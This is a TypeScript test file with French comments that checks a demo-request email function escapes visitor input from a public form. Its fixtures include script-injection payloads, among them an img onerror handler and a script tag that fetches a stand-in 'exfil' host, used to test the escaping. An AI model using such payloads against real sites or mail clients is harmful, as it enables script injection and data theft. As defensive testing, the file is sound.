/**
 * GOLDEN — Le courriel de demande de démo est construit à partir d'un
 * formulaire PUBLIC. Tout ce qui vient du visiteur doit être échappé avant
 * d'entrer dans le HTML, sinon une balise hostile arrive intacte dans la boîte
 * du destinataire (et dans certains clients, s'exécute).
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

const { sendMailMock } = vi.hoisted(() => ({ sendMailMock: vi.fn().mockResolvedValue(undefined) }))
vi.mock('nodemailer', () => ({
  default: { createTransport: vi.fn(() => ({ sendMail: sendMailMock, verify: vi.fn() })) },
  createTransport: vi.fn(() => ({ sendMail: sendMailMock, verify: vi.fn() })),
}))
vi.mock('../db/pool.js', () => ({ pool: { query: vi.fn().mockResolvedValue({ rows: [] }) } }))
vi.mock('../config.js', () => ({
  config: {
    env: 'test',
    smtp: { host: 'smtp.test', port: 587, user: 'u', pass: 'p', from: 'NexusRH <no-reply@openlabconsulting.com>' },
    jwt: { secret: 'test-secret-minimum-32-characters-ok!' },
  },
}))

import { sendDemoRequestEmail, escapeHtml } from './email.js'

beforeEach(() => { sendMailMock.mockReset().mockResolvedValue(undefined) })

describe('escapeHtml', () => {
  it('neutralise les caractères actifs du HTML', () => {
    expect(escapeHtml('<script>alert("x")</script>'))
      .toBe('&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;')
    expect(escapeHtml("O'Brien & fils")).toBe('O&#39;Brien &amp; fils')
  })
})

describe('sendDemoRequestEmail', () => {
  it('échappe le message et la société avant de les insérer dans le HTML', async () => {
    await sendDemoRequestEmail({
      to: 'waopron@openlabconsulting.com',
      fullName: 'Awa Koné',
      company: '<img src=x onerror=alert(1)>',
      email: 'awa@sotra.ci',
      message: '<script>fetch("http://exfil")</script>',
    })
    const sent = sendMailMock.mock.calls[0]![0] as { html: string; text: string; replyTo: string; to: string }
    expect(sent.html).not.toContain('<script>')
    expect(sent.html).not.toContain('<img src=x')
    expect(sent.html).toContain('&lt;script&gt;')
    expect(sent.html).toContain('&lt;img src=x')
  })

  it('adresse le courriel au bon destinataire et permet de répondre au prospect', async () => {
    await sendDemoRequestEmail({
      to: 'waopron@openlabconsulting.com',
      fullName: 'Awa Koné', company: 'SOTRA', email: 'awa@sotra.ci',
    })
    const sent = sendMailMock.mock.calls[0]![0] as { to: string; replyTo: string; from: string }
    expect(sent.to).toBe('waopron@openlabconsulting.com')
    expect(sent.replyTo).toBe('awa@sotra.ci')
    // L'expéditeur reste la plateforme : un nom hostile ne se déguise pas en en-tête.
    expect(sent.from).toContain('openlabconsulting.com')
  })
})
